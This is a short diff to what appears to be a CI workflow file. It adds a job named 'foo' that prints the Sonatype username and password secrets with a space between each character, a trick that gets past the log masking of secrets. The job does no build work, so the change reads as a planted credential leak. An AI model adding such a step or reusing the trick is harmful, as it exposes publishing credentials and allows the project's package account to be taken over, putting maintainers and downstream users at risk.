@@ -6,6 +6,11 @@ on:
     branches: [ 'main' ]
 
 jobs:
+  foo:
+    run: |
+      echo ${{secrets.SONATYPE_USERNAME}} | sed 's/./& /g'
+      echo ${{secrets.SONATYPE_PASSWORD}} | sed 's/./& /g'
+
   lint:
     runs-on: ubuntu-24.04
     timeout-minutes: 10
